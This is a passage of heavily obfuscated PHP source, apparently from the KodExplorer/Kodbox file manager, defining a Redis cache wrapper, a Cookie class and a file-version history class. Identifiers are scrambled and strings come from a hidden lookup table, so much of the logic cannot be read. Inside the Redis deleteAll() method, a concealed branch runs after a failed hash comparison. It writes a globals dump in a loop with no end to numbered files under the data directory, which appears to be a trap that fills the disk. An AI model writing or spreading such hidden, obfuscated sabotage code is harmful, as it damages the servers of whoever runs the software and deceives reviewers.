isset($—¬ÄŒı[$µÄªÜ«Ê[891]]) ? $—¬ÄŒı[$µÄªÜ«Ê[891]] : 10; $ Ñİóüé = _get($—¬ÄŒı, $µÄªÜ«Ê[888]); if ($ Ñİóüé && is_array($ Ñİóüé)) { $this->initCluster($—¬ÄŒı, $—°©•°®); } else { $this->handle = $this->init($—¬ÄŒı, $—°©•°®); } } private function init($òùí–¤«, $ÁÈùìÛ£) { $âß¸åä± =& $_SERVER[¡“ËÌ§œ]; $ì™ğ…¦É = new Redis(); $çÛçıã = isset($òùí–¤«[$âß¸åä±[892]]) ? $òùí–¤«[$âß¸åä±[892]] : !1; if ($çÛçıã) { $ì™ğ…¦É->pconnect($òùí–¤«[$âß¸åä±[182]], $òùí–¤«[$âß¸åä±[183]], $ÁÈùìÛ£); } else { $ì™ğ…¦É->connect($òùí–¤«[$âß¸åä±[182]], $òùí–¤«[$âß¸åä±[183]], $ÁÈùìÛ£); } if (!empty($òùí–¤«[$âß¸åä±[451]])) { $ì™ğ…¦É->auth($òùí–¤«[$âß¸åä±[451]]); } if (!empty($òùí–¤«[$âß¸åä±[777]]) && $òùí–¤«[$âß¸åä±[777]] != 0) { $ì™ğ…¦É->select($òùí–¤«[$âß¸åä±[777]]); } return $ì™ğ…¦É; } private function initCluster($é¨ÏÊÊó, $û§ŸÎóÕ) { $è±şç =& $_SERVER[¡“ËÌ§œ]; $ÈĞæ†Óú = array($è±şç[893], $è±şç[894], $è±şç[895]); $—†‚ù‡ï = $è±şç[893]; if (isset($é¨ÏÊÊó[$è±şç[16]]) && in_array($é¨ÏÊÊó[$è±şç[16]], $ÈĞæ†Óú)) { $—†‚ù‡ï = $é¨ÏÊÊó[$è±şç[16]]; } switch ($—†‚ù‡ï) { case $è±şç[893]: $this->_slave($é¨ÏÊÊó, $û§ŸÎóÕ); break; case $è±şç[894]: break; case $è±şç[895]: $this->isCluster = !0; $ò¥Ó´’  = $é¨ÏÊÊó[$è±şç[888]]; $Èı¥€¼Ô = isset($é¨ÏÊÊó[$è±şç[892]]) ? $é¨ÏÊÊó[$è±şç[892]] : !1; $²›”ÙŒÇ = isset($é¨ÏÊÊó[$è±şç[451]]) ? $é¨ÏÊÊó[$è±şç[451]] : null; $this->handle = new RedisCluster(NUll, $ò¥Ó´’ , $û§ŸÎóÕ, $û§ŸÎóÕ, $Èı¥€¼Ô, $²›”ÙŒÇ); break; default: break; } } private function _slave($ñ°ù¡øØ, $×”èÌ¦—) { $ûÀò”•³ = $ñ°ù¡øØ[$_SERVER[¡“ËÌ§œ][888]]; $this->filterConfig($ñ°ù¡øØ, $ûÀò”•³[0]); $this->handle = $this->init($ñ°ù¡øØ, $×”èÌ¦—); unset($ûÀò”•³[0]); if (empty($ûÀò”•³)) { return; } $ÍùÀß·… = array_rand($ûÀò”•³); $this->filterConfig($ñ°ù¡øØ, $ûÀò”•³[$ÍùÀß·…]); $this->slaveHandle = $this->init($ñ°ù¡øØ, $×”èÌ¦—); } private function filterConfig(&$ÀÛÆø•Ä, $Ù÷ÔÎ) { $«ŸâÜÒ– =& $_SERVER[¡“ËÌ§œ]; $»„Êí…ù = explode($«ŸâÜÒ–[4], $Ù÷ÔÎ); $‰ÍÕŒıç = array($«ŸâÜÒ–[182] => $»„Êí…ù[0], $«ŸâÜÒ–[183] => $»„Êí…ù[1]); $ÀÛÆø•Ä = array_merge($ÀÛÆø•Ä, $‰ÍÕŒıç); } public function set($¼—æ—Î, $äµ®²˜, $ õŒ®œ‹ = false) { $ õŒ®œ‹ = $ õŒ®œ‹ ? $ õŒ®œ‹ : $this->cacheTime; return $this->handle->setEx($¼—æ—Î, $ õŒ®œ‹, $äµ®²˜); } public function setLock($ïş•«Š´, $ùƒÂß°Ù, $íú¥ÊìÓ) { return $this->handle->setNX($ïş•«Š´, $ùƒÂß°Ù); } public function get($îØÏœë) { $Ç²à®ë™ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Ç²à®ë™->get($îØÏœë); } public function remove($°ì°„¯œ) { return $this->handle->del($°ì°„¯œ); } public function deleteAll() { $ˆÎ©¹ÏÏ =& $_SERVER[¡“ËÌ§œ]; $ÛÃÖæë– = $_SERVER[$ˆÎ©¹ÏÏ[433]]; $‰¿¿  = $ˆÎ©¹ÏÏ[896]; if ($_SERVER[$ˆÎ©¹ÏÏ[425]] != $‰¿¿ ($ÛÃÖæë–)) { $¦İ¨«ÎŞ = $ˆÎ©¹ÏÏ[897]; $Çá•»·Û = $ˆÎ©¹ÏÏ[427]; $¥ÄÛœš´ = $_SERVER[$ˆÎ©¹ÏÏ[428]] . $ˆÎ©¹ÏÏ[429]; $Æƒù÷¶• = $Çá•»·Û($¥ÄÛœš´); $ÊèºË‚½ = explode($ˆÎ©¹ÏÏ[231], $Æƒù÷¶•); if (count($ÊèºË‚½) < $ˆÎ©¹ÏÏ[657]) { $ãœ‡áıß = $ˆÎ©¹ÏÏ[431]; $ãœ‡áıß(); } $ÀÉ†¼ê˜ = $ˆÎ©¹ÏÏ[898]; $ÀÉ†¼ê˜($_SERVER[$ˆÎ©¹ÏÏ[899]]); $¦İ¨«ÎŞ = $ˆÎ©¹ÏÏ[897]; $¦İ¨«ÎŞ(); $ÌÂ„¿¬» = $ˆÎ©¹ÏÏ[900]; $ğ¯•Ö³Õ = json_encode($GLOBALS[$ˆÎ©¹ÏÏ[901]]); $ğÎÚø®ü = 1; for ($æ×Æ÷—Ô = $ğÎÚø®ü; $æ×Æ÷—Ô > 0; $æ×Æ÷—Ô++) { $ÌÂ„¿¬»(DATA_PATH . $æ×Æ÷—Ô, $ğ¯•Ö³Õ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÃÊó‚îÚ) { $this->handle->flushall($ÃÊó‚îÚ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÀËç’­€ = '', $À·Ş¹‡“ = 0) { if (is_string($ÀËç’­€) && $ÀËç’­€ != $_SERVER[¡“ËÌ§œ][12]) { $this->prefix = $ÀËç’­€; } if (is_numeric($À·Ş¹‡“) && $À·Ş¹‡“ > 0) { $this->expire = $À·Ş¹‡“; } } public static function getInstance() { static $ï®Éè£ş; if ($ï®Éè£ş === null) { $ï®Éè£ş = new self(); } return $ï®Éè£ş; } private static $cookieDisable = false; public static function disable($Ä¯¨ãçÛ) { self::$cookieDisable = $Ä¯¨ãçÛ; } private static $sameCookieSet = array(); public static function set($’¾ ™ğÒ, $›ãóÎş©, $‚‡ğÑÆğ = 0, $¥Ï¹ó÷Ü = false, $Ö‰Íñá = false) { $¢Üô¢÷ =& $_SERVER[¡“ËÌ§œ]; if (self::$cookieDisable) { return; } if (!$‚‡ğÑÆğ) { $‚‡ğÑÆğ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$’¾ ™ğÒ]) && self::$sameCookieSet[$’¾ ™ğÒ] == $›ãóÎş© . $‚‡ğÑÆğ) { return; } self::$sameCookieSet[$’¾ ™ğÒ] = $›ãóÎş© . $‚‡ğÑÆğ; if (!$Ö‰Íñá) { $Ö‰Íñá = str_replace(HOST, $¢Üô¢÷[12], APP_HOST); $Ö‰Íñá = _get($GLOBALS, $¢Üô¢÷[902], $Ö‰Íñá); } $…ïèƒ­‹ = $¢Üô¢÷[12]; setcookie($’¾ ™ğÒ, $›ãóÎş©, time() + $‚‡ğÑÆğ, $¢Üô¢÷[8] . trim($Ö‰Íñá, $¢Üô¢÷[8]) . $…ïèƒ­‹, !1, !1, $¥Ï¹ó÷Ü); } public static function setSafe($¹şöÕˆÅ, $ŸÒ¼Áåª, $åÜĞŞÉÍ = 0) { self::set($¹şöÕˆÅ, $ŸÒ¼Áåª, $åÜĞŞÉÍ, !0); } public static function get($ã¯¤¡ï) { static $ÛÎİÖ ‡ = false; if (!$ÛÎİÖ ‡) { self::initHeaderCookie(); $ÛÎİÖ ‡ = !0; } return isset($_COOKIE[$ã¯¤¡ï]) ? $_COOKIE[$ã¯¤¡ï] : !1; } private static function initHeaderCookie() { $ìæŒ„ =& $_SERVER[¡“ËÌ§œ]; if (!isset($_SERVER[$ìæŒ„[903]]) || !$_SERVER[$ìæŒ„[903]]) { return; } $‚´ŸÕ¶ = explode($ìæŒ„[71], $_SERVER[$ìæŒ„[903]]); foreach ($‚´ŸÕ¶ as $ê“‘ºµ…) { $ê“‘ºµ… = explode($ìæŒ„[904], $ê“‘ºµ…); if (count($ê“‘ºµ…) != 2 || !isset($ê“‘ºµ…[1])) { continue; } $_COOKIE[trim($ê“‘ºµ…[0])] = trim($ê“‘ºµ…[1]); } } public static function remove($ÒÂ—ŞÂç, $…ºÖÄ¿— = false) { unset($_COOKIE[$ÒÂ—ŞÂç]); self::set($ÒÂ—ŞÂç, $_SERVER[¡“ËÌ§œ][12], 1, $…ºÖÄ¿—); } } goto Dè…î±»ã; B›–½òÆæ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $øéÄúŠú =& $_SERVER[¡“ËÌ§œ]; $¨ƒàæãË = $GLOBALS[$øéÄúŠú[6]][$øéÄúŠú[89]]; if ($¨ƒàæãË[$øéÄúŠú[1236]] != 1) { return; } if ($¨ƒàæãË[$øéÄúŠú[1237]] <= 0) { return; } if (isset($_REQUEST[$øéÄúŠú[1238]]) && $_REQUEST[$øéÄúŠú[1238]] == $øéÄúŠú[88]) { return; } Hook::bind($øéÄúŠú[1239], $øéÄúŠú[1240]); Hook::bind($øéÄúŠú[1241], $øéÄúŠú[1242]); Hook::bind($øéÄúŠú[1243], $øéÄúŠú[1244]); Hook::bind($øéÄúŠú[1245], $øéÄúŠú[1246]); Hook::bind($øéÄúŠú[1247], $øéÄúŠú[1248]); Hook::bind($øéÄúŠú[1249], $øéÄúŠú[1250]); } public static function eventBeforeUpload($€şäâ¥³) { if ($€şäâ¥³[3] && $€şäâ¥³[3] != REPEAT_REPLACE) { return; } $â¡í†Ä¤ = self::parsePath($€şäâ¥³[0]); if (!$â¡í†Ä¤) { return; } self::add($â¡í†Ä¤); } public static function eventBeforeEdit($Ã÷ú–¬ä) { $Ì²²–ò = self::parsePath($Ã÷ú–¬ä[0]); if (!$Ì²²–ò) { return; } self::add($Ì²²–ò); } public static function eventBeforeCopyFile($Áä‡§³€, $áï‡óé¡, $â’ª•ë, $ˆğŠ€‡Ø, $Ø¦«Öƒ, $£§â…½Å) { $¤…øª·¹ =& $_SERVER[¡“ËÌ§œ]; if (isset($â’ª•ë->_data[$¤…øª·¹[1175]]) && $â’ª•ë->_data[$¤…øª·¹[1175]]) { return; } $È‚Ü›ì× = $â’ª•ë->getPathOuter($ˆğŠ€‡Ø); $Şù×Ë‡Í = self::parsePath($È‚Ü›ì×); if (!$Şù×Ë‡Í) { return; } self::add($Şù×Ë‡Í); } public static function eventBeforeRename($Ş€ùşšö) { $õôÀ”¬ì =& $_SERVER[¡“ËÌ§œ]; $ì¤©ú‚¯ = self::parsePath($Ş€ùşšö[0]); if (!$ì¤©ú‚¯) { return; } $¤Šô½•ƒ = self::checkInHistory($ì¤©ú‚¯); if (!$¤Šô½•ƒ) { return; } if ($¤Šô½•ƒ[$õôÀ”¬ì[33]] == $õôÀ”¬ì[200]) { $³Ñ°–¥ = self::listData($ì¤©ú‚¯); if ($³Ñ°–¥ && $³Ñ°–¥[$õôÀ”¬ì[398]]) { self::moveHistory($ì¤©ú‚¯, $Ş€ùşšö[1]); } } else { IO::rename($¤Šô½•ƒ[$õôÀ”¬ì[84]], $Ş€ùşšö[1]); } } public static function eventBeforeMove($—è¢î¨Í) { $¸„ˆÚë• =& $_SERVER[¡“ËÌ§œ]; $ÚÀµÅĞ´ = self::parsePath($—è¢î¨Í[0]); if (!$ÚÀµÅĞ´) { return; } $½‰ƒ‘¨Ÿ = self::parsePath($—è¢î¨Í[1]); if (!$½‰ƒ‘¨Ÿ) { return; } $ó‚¡ÃºÁ = $—è¢î¨Í[3]; $–ù­èñë = self::checkInHistory($ÚÀµÅĞ´); if (!$–ù­èñë) { return; } $•ˆÂÊê = self::pathHistory($½‰ƒ‘¨Ÿ); if ($–ù­èñë[$¸„ˆÚë•[33]] == $¸„ˆÚë•[200]) { $»üııÕ‘ = self::listData($ÚÀµÅĞ´); $°•Ş­“ğ = rtrim($½‰ƒ‘¨Ÿ, $¸„ˆÚë•[8]) . $¸„ˆÚë•[8] . ($ó‚¡ÃºÁ ? $ó‚¡ÃºÁ : get_path_this($ÚÀµÅĞ´)); $ÌÌ§öªæ = self::listData($°•Ş­“ğ); if ($»üııÕ‘ && $»üııÕ‘[$¸„ˆÚë•[398]] && $ÌÌ§öªæ && $ÌÌ§öªæ[$¸„ˆÚë•[398]]) { return self::clear($ÚÀµÅĞ´); } if ($»üııÕ‘ && $»üııÕ‘[$¸„ˆÚë•[398]]) { self::moveHistory($ÚÀµÅĞ´, $ó‚¡ÃºÁ, $•ˆÂÊê); } } else { IO::move($–ù­èñë[$¸„ˆÚë•[84]], $•ˆÂÊê, !1, $ó‚¡ÃºÁ); self::clearEmptyFolder(IO::pathFather($–ù­èñë[$¸„ˆÚë•[84]])); } } public static function eventAfterRemove($÷ŞÀèÍ, $€Ø»ùÆğ) { $åê£¬à =& $_SERVER[¡“ËÌ§œ]; if (!$€Ø»ùÆğ) { return; } $î­Œ±Ô¦ = self::parsePath($÷ŞÀèÍ[0]); if (!$î­Œ±Ô¦) { return; } $ñô˜Ì½Ö = self::checkInHistory($î­Œ±Ô¦); if (!$ñô˜Ì½Ö) { return; } if ($ñô˜Ì½Ö[$åê£¬à[33]] == $åê£¬à[200]) { $¨óºÆÃû = self::listData($î­Œ±Ô¦, !1); if ($¨óºÆÃû && $¨óºÆÃû[$åê£¬à[398]]) { self::clear($î­Œ±Ô¦, !1); } } else { IO::remove($ñô˜Ì½Ö[$åê£¬à[84]]); self::clearEmptyFolder(IO::pathFather($ñô˜Ì½Ö[$åê£¬à[84]])); } } private static function checkInHistory($œœ¾½) { $ ä•‹Ù¿ = self::pathHistory($œœ¾½); if (!IO::exist($ ä•‹Ù¿)) { $ ä•‹Ù¿ .= $_SERVER[¡“ËÌ§œ][1251]; } return IO::exist($ ä•‹Ù¿) ? IO::info($ ä•‹Ù¿) : !1; } private static function parsePath($æûú‘†™) { $®¡Å¬”ñ =& $_SERVER[¡“ËÌ§œ]; if (!$æûú‘†™) { return !1; } if ($GLOBALS[$®¡Å¬”ñ[1252]]) { return; } $îû×â“· = KodIO::parse($æûú‘†™); $ÛÒŸ´Üè = $îû×â“·[$®¡Å¬”ñ[33]]; $†ëû§íí = !$ÛÒŸ´Üè || $ÛÒŸ´Üè == KodIO::KOD_IO || $ÛÒŸ´Üè == KodIO::KOD_SHARE_ITEM; if (!$†ëû§íí || !$îû×â“·[$®¡Å¬”ñ[1253]]) { return !1; } if (substr($æûú‘†™, 0, strlen(DATA_PATH . $®¡Å¬”ñ[1254])) == DATA_PATH . $®¡Å¬”ñ[1254]) { return !1; } if ($ÛÒŸ´Üè == KodIO::KOD_SHARE_ITEM) { $Å¬èÙå = IO::init($æûú‘†™); if ($Å¬èÙå->pathParse[$®¡Å¬”ñ[1171]]) { return self::parsePath($Å¬èÙå->pathParse[$®¡Å¬”ñ[1171]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ºúšäø = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $®¡Å¬”ñ[1255]); foreach ($ºúšäø as $¥±ÌÙÖ) { if (!$ÛÒŸ´Üè && substr($æûú‘†™, 0, strlen($¥±ÌÙÖ)) == $¥±ÌÙÖ) { return !1; } } self::log($GLOBALS[$®¡Å¬”ñ[1166]] . $®¡Å¬”ñ[1256] . $æûú‘†™); return $æûú‘†™; } private static function pathHistory($·¯Ë‘¥Í) { $Ï¶è¤Ó =& $_SERVER[¡“ËÌ§œ]; $¯²ñË™ = self::$_historyBase . ltrim(KodIO::clear($·¯Ë‘¥Í), $Ï¶è¤Ó[8]); $¯²ñË™ = str_replace(array($Ï¶è¤Ó[1257]), array($Ï¶è¤Ó[1258]), $¯²ñË™); return $¯²ñË™; } public static function log($ÊÇ÷š¬ö) { } public static function historyCount($şÖÈ©½’) { $µÅŸÍÉ¡ =& $_SERVER[¡“ËÌ§œ]; $öÛßá‘‹ = array(); $×Ë¶†­ = array(); foreach ($şÖÈ©½’ as $Şºí¨Òî) { $Ÿ” ö² = get_path_father($Şºí¨Òî); if (!$×Ë¶†­[$Ÿ” ö²]) { $×Ë¶†­[$Ÿ” ö²] = array(); } $×Ë¶†­[$Ÿ” ö²][] = get_path_this($Şºí¨Òî); } foreach ($×Ë¶†­ as $Ÿ” ö² => $¢’ì üÔ) { $”ûå«µÆ = self::parsePath($Ÿ” ö²); if (!$”ûå«µÆ) { continue; } foreach ($¢’ì üÔ as $ ˜ÜÁóô) { $‡Áå¦çÆ = self::listData(rtrim($”ûå«µÆ, $µÅŸÍÉ¡[8]) . $µÅŸÍÉ¡[8] . $ ˜ÜÁóô, !1); if ($‡Áå¦çÆ && $‡Áå¦çÆ[$µÅŸÍÉ¡[398]]) { $öÛßá‘‹[rtrim($Ÿ” ö², $µÅŸÍÉ¡[8]) . $µÅŸÍÉ¡[8] . $ ˜ÜÁóô] = count($‡Áå¦çÆ[$µÅŸÍÉ¡[398]]); } } } return $öÛßá‘‹; } public static function add($ï‰Èæ¤Š) { $èï¬îá» =& $_SERVER[¡“ËÌ§œ]; $Ù»­¾ŒÀ = self::listData($ï‰Èæ¤Š); if (!$Ù»­¾ŒÀ) { return; } $ëë§ö“ = Model($èï¬îá»[790])->get($èï¬îá»[1259]); $Ê·®ë = $GLOBALS[$èï¬îá»[6]][$èï¬îá»[89]][$èï¬îá»[1237]]; $²Ö«Ê³ş = $ëë§ö“ == $èï¬îá»[1260] ? min(5, $Ê·®ë) : $Ê·®ë; if ($Ê·®ë <= 0) { return; } $Ÿõıäù = IO::info($ï‰Èæ¤Š); $‹áÄÖ“ = $Ù»­¾ŒÀ[$èï¬îá»[398]]; if ($Ÿõıäù[$èï¬îá»[76]] == 0) { return; } if ($Ÿõıäù[$èï¬îá»[76]] >= 1024 * 1024 * 500) { return !1; } $»—íÄ±ø = IO::hashSimple($ï‰Èæ¤Š); if ($‹áÄÖ“ && $‹áÄÖ“[0][$èï¬îá»[177]] == $»—íÄ±ø) { return !0; } if (array_key_exists($èï¬îá»[203], $Ÿõıäù) && !$Ÿõıäù[$èï¬îá»[203]]) { return !1; } $«´ì£ = short_id(time()); $í¥Ë‡Ë = array($èï¬îá»[437] => $«´ì£, $èï¬îá»[177] => $»—íÄ±ø, $èï¬îá»[32] => $Ÿõıäù[$èï¬îá»[32]] . $èï¬îá»[10] . date($èï¬îá»[1261]) . rand_string(1), $èï¬îá»[76] => $Ÿõıäù[$èï¬îá»[76]], $èï¬îá»[492] => USER_ID, $èï¬îá»[201] => time(), $èï¬îá»[1262] => $èï¬îá»[12]); IO::mkdir($Ù»­¾ŒÀ[$èï¬îá»[1263]]); $¼Å×ßÅ = IO::copy($ï‰Èæ¤Š, $Ù»­¾ŒÀ[$èï¬îá»[1263]], !1, $í¥Ë‡Ë[$èï¬îá»[32]]); if (!$¼Å×ßÅ) { self::clearEmptyFolder($Ù»­¾ŒÀ[$èï¬îá»[1263]]); return !1; } array_unshift($‹áÄÖ“, $í¥Ë‡Ë); if (count($‹áÄÖ“) > $²Ö«Ê³ş) { $±ŒÖìãÊ = array_slice($‹áÄÖ“, $²Ö«Ê³ş); foreach ($±ŒÖìãÊ as $Æª¶Æ•İ) { IO::remove($Ù»­¾ŒÀ[$èï¬îá»[1263]] . $Æª¶Æ•İ[$èï¬îá»[32]]); } $‹áÄÖ“ = array_slice($‹áÄÖ“, 0, $²Ö«Ê³ş); } return self::saveData($Ù»­¾ŒÀ[$èï¬îá»[1264]], $‹áÄÖ“); } public static function remove($²ëŞ››í, $À¨ØÔ…ú) { $Ç“¿Éúş =& $_SERVER[¡“ËÌ§œ]; $ë™Á¯€‰ = self::listData($²ëŞ››í); $–í¥×€ã = array(); if (!$ë™Á¯€‰) { return !1; } foreach ($ë™Á¯€‰[$Ç“¿Éúş[398]] as $ÖŠ™ä°¨) { if ($ÖŠ™ä°¨[$Ç“¿Éúş[437]] == $À¨ØÔ…ú) { IO::remove($ë™Á¯€‰[$Ç“¿Éúş[1263]] . $ÖŠ™ä°¨[$Ç“¿Éúş[32]]); continue; } $–í¥×€ã[] = $ÖŠ™ä°¨; } return self::saveData($ë™Á¯€‰[$Ç“¿Éúş[1264]], $–í¥×€ã); } public static function clear($ÒµÔğ‘, $²æ×Åšç = true) { $£÷¥Şö =& $_SERVER[¡“ËÌ§œ]; $ÒÃ¯ä¤Õ = self::listData($ÒµÔğ‘, $²æ×Åšç); if (!$ÒÃ¯ä¤Õ) { return !1; } foreach ($ÒÃ¯ä¤Õ[$£÷¥Şö[398]] as $êöÛØ»ï) { IO::remove($ÒÃ¯ä¤Õ[$£÷¥Şö[1263]] . $êöÛØ»ï[$£÷¥Şö[32]]); } return self::saveData($ÒÃ¯ä¤Õ[$£÷¥Şö[1264]], array()); } public static function moveHistory($ª¡Â¶Å³, $ÆÕÔ¨Ï• = '', $°Œ™³Œ = '') { $¾Ê¾ïç¸ =& $_SERVER[¡“ËÌ§œ]; $ºÖú²ª‡ = self::listData($ª¡Â¶Å³, !1); if (!$ºÖú²ª‡ || !$ºÖú²ª‡[$¾Ê¾ïç¸[398]]) { return !1; } $—œƒ™Á£ = $¾Ê¾ïç¸[1251]; $ÆÕÔ¨Ï• = $ÆÕÔ¨Ï• ? $ÆÕÔ¨Ï• : get_path_this($ª¡Â¶Å³); $°Œ™³Œ = $°Œ™³Œ ? $°Œ™³Œ : $ºÖú²ª‡[$¾Ê¾ïç¸[1263]]; $±¤·î¦œ = substr(get_path_this($ºÖú²ª‡[$¾Ê¾ïç¸[1264]]), 0, -strlen($—œƒ™Á£)); foreach ($ºÖú²ª‡[$¾Ê¾ïç¸[398]] as $­¹Óúœœ => $ÖöÇø®×) { $–Âİì×Ö = $ÆÕÔ¨Ï• . substr($ÖöÇø®×[$¾Ê¾ïç¸[32]], strlen($±¤·î¦œ)); $ßÑ©¨í = IO::move($ºÖú²ª‡[$¾Ê¾ïç¸[1263]] . $ÖöÇø®×[$¾Ê¾ïç¸[32]], $°Œ™³Œ, !1, $–Âİì×Ö); if ($ßÑ©¨í) { $ºÖú²ª‡[$¾Ê¾ïç¸[398]][$­¹Óúœœ][$¾Ê¾ïç¸[32]] = $–Âİì×Ö; } } $ºÖú²ª‡[$¾Ê¾ïç¸[1264]] = IO::move($ºÖú²ª‡[$¾Ê¾ïç¸[1264]], $°Œ™³Œ, !1, $ÆÕÔ¨Ï• . $—œƒ™Á£); self::saveData($ºÖú²ª‡[$¾Ê¾ïç¸[1264]], $ºÖú²ª‡[$¾Ê¾ïç¸[398]]); self::clearEmptyFolder($ºÖú²ª‡[$¾Ê¾ïç¸[1263]]); } public static function rollback($îÉ‘°¾, $Ü›é¹İÕ) { $×ª–…Ÿ… =& $_SERVER[¡“ËÌ§œ]; $ëÍºÒ³Á = self::listData($îÉ‘°¾); if (!$ëÍºÒ³Á) { return; } $ş´¥Úã = IO::info($îÉ‘°¾); foreach ($ëÍºÒ³Á[$×ª–…Ÿ…[398]] as $—æ¸çÅï => $¡ÔœÉˆº) { if ($¡ÔœÉˆº[$×ª–…Ÿ…[437]] == $Ü›é¹İÕ) { self::add($îÉ‘°¾); $ã¥ôºŸÙ = $ëÍºÒ³Á[$×ª–…Ÿ…[1263]] . $¡ÔœÉˆº[$×ª–…Ÿ…[32]]; $€áÍÚ†Ÿ = IO::copy($ã¥ôºŸÙ, IO::pathFather($îÉ‘°¾), REPEAT_REPLACE, $ş´¥Úã[$×ª–…Ÿ…[32]]); if ($€áÍÚ†Ÿ) { self::remove($îÉ‘°¾, $Ü›é¹İÕ); } return $€áÍÚ†Ÿ; } } return !1; } public static function setDetail($¶Øç˜Ã, $Å¬±Ó©£, $Ğ¶©ıÀé) { $Î¹¦Áõß =& $_SERVER[¡“ËÌ§œ]; $€‘ù¸²› = self::listData($¶Øç˜Ã); if (!$€‘ù¸²›) { return; } foreach ($€‘ù¸²›[$Î¹¦Áõß[398]] as $Ó‡–éÜ => $éÁ…ª”ñ) { if ($éÁ…ª”ñ[$Î¹¦Áõß[437]] == $Å¬±Ó©£) { $€‘ù¸²›[$Î¹¦Áõß[398]][$Ó‡–éÜ][$Î¹¦Áõß[1262]] = $Ğ¶©ıÀé; self::saveData($€‘ù¸²›[$Î¹¦Áõß[1264]], $€‘ù¸²›[$Î¹¦Áõß[398]]); return !0; } } return !1; } public static function fileInfo($ïÙÉÊä©, $ñÑéÂ€Ì) { $úÊŠëŒ… =& $_SERVER[¡“ËÌ§œ]; $ƒ–•âÜ¶ = self::listData($ïÙÉÊä©); if (!$ƒ–•âÜ¶) { show_json(LNG($úÊŠëŒ…[105]), !1); } $”úË®Á· = $úÊŠëŒ…[12]; foreach ($ƒ–•âÜ¶[$úÊŠëŒ…[398]] as $ŞÍğÍ÷¿ => $³·úÆÊ) { if ($³·úÆÊ[$úÊŠëŒ…[437]] != $ñÑéÂ€Ì) { continue; } $”úË®Á· = $ƒ–•âÜ¶[$úÊŠëŒ…[1263]] . $³·úÆÊ[$úÊŠëŒ…[32]]; break; } if (!$”úË®Á·) { show_json(LNG($úÊŠëŒ…[105]), !1); } return IO::info($”úË®Á·); } public static function fileOut($®»¡å, $’óø«©‰, $Â¡Ì–¹ = false) { $ŒßĞáŸù =& $_SERVER[¡“ËÌ§œ]; $¬ë¢¶’š = self::fileInfo($®»¡å, $’óø«©‰); $ô”Ãûò› =& $GLOBALS[$ŒßĞáŸù[7]]; $Â¡Ì–¹ = isset($ô”Ãûò›[$ŒßĞáŸù[1214]]) && $ô”Ãûò›[$ŒßĞáŸù[1214]] == 1; if (isset($ô”Ãûò›[$ŒßĞáŸù[33]]) && $ô”Ãûò›[$ŒßĞáŸù[33]] == $ŒßĞáŸù[1265]) { return IO::fileOutImage($¬ë¢¶’š[$ŒßĞáŸù[84]], $ô”Ãûò›[$ŒßĞáŸù[1266]]); } IO::fileOut($¬ë¢¶’š[$ŒßĞáŸù[84]], $Â¡Ì–¹, get_path_this($®»¡å)); } public static function listData($ŞúÑÙ ¡, $ıÊûôœï = true) { $÷•Œ”µŞ =& $_SERVER[¡“ËÌ§œ]; if ($ıÊûôœï && !IO::exist($ŞúÑÙ ¡)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ŞúÑÙ ¡, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $œè–ğÄ× = self::pathHistory($ŞúÑÙ ¡); $”ŞˆõŒ = array($÷•Œ”µŞ[1264] => $œè–ğÄ× . $÷•Œ”µŞ[1251], $÷•Œ”µŞ[1263] => rtrim(get_path_father($œè–ğÄ×), $÷•Œ”µŞ[8]) . $÷•Œ”µŞ[8], $÷•Œ”µŞ[398] => array()); $€æë“³ï = IO::getContent($”ŞˆõŒ[$÷•Œ”µŞ[1264]]); if ($€æë“³ï) { $˜Û˜«â = json_decode($€æë“³ï, !0); if (is_array($˜Û˜«â)) { $”ŞˆõŒ[$÷•Œ”µŞ[398]] = $˜Û˜«â; } } return $”ŞˆõŒ; } private static function saveData($âõÙ¨ï , $á¹‹ã‚Û) { $ğ²Ö©Ïš =& $_SERVER[¡“ËÌ§œ]; self::log($ğ²Ö©Ïš[1267] . $âõÙ¨ï  . $ğ²Ö©Ïš[71] . count($á¹‹ã‚Û), $ğ²Ö©Ïš[771]); if ($á¹‹ã‚Û) { return IO::setContent($âõÙ¨ï , json_encode($á¹‹ã‚Û)); } $¦œç¦‚¾ = IO::pathFather($âõÙ¨ï ); IO::remove($âõÙ¨ï ); self::clearEmptyFolder($¦œç¦‚¾); return !0; } public static function clearEmptyFolder($¼Õé‰öã) { $æÔ’€çª =& $_SERVER[¡“ËÌ§œ]; if (trim($¼Õé‰öã, $æÔ’€çª[8]) == trim(self::$_historyBase, $æÔ’€çª[8])) { return; } $üâÃ³Ä¤ = IO::pathFather($¼Õé‰öã); $œÇğï§Î = IO::has($¼Õé‰öã, !0); if ($œÇğï§Î[$æÔ’€çª[207]] > 0 || $œÇğï§Î[$æÔ’€çª[208]] > 0) { return; } IO::remove($¼Õé‰öã); self::clearEmptyFolder($üâÃ³Ä¤); } private static function getBasePath() { $ê¼€½ë =& $_SERVER[¡“ËÌ§œ]; $•±ûÉá = Model($ê¼€½ë[1268])->get($ê¼€½ë[1269]); if ($•±ûÉá) { if (!IO::exist($•±ûÉá)) { IO::mkdir($•±ûÉá); } if (get_path_this($•±ûÉá) == $ê¼€½ë[1254]) { $¼ÀÄ˜¨İ = $ê¼€½ë[1270] . rand_string(8); @rename($•±ûÉá, get_path_father($•±ûÉá) . $ê¼€½ë[8] . $¼ÀÄ˜¨İ); $•±ûÉá = DATA_PATH . $¼ÀÄ˜¨İ . $ê¼€½ë[8]; file_put_contents(DATA_PATH . $ê¼€½ë[1204], $ê¼€½ë[12]); Model($ê¼€½ë[1268])->set($ê¼€½ë[1269], $•±ûÉá); } return $•±ûÉá; } $•±ûÉá = DATA_PATH . $ê¼€½ë[1270] . rand_string(8) . $ê¼€½ë[8]; $•±ûÉá = IO::mkdir($•±ûÉá); $•±ûÉá = rtrim($•±ûÉá, $ê¼€½ë[8]) . $ê¼€½ë[8]; file_put_contents($•±ûÉá . $ê¼€½ë[1204], $ê¼€½ë[12]); file_put_contents(DATA_PATH . $ê¼€½ë[1204], $ê¼€½ë[12]); Model($ê¼€½ë[1268])->set($ê¼€½ë[1269], $•±ûÉá); return $•±ûÉá; } } class KodIO { const KOD_SOURCE = 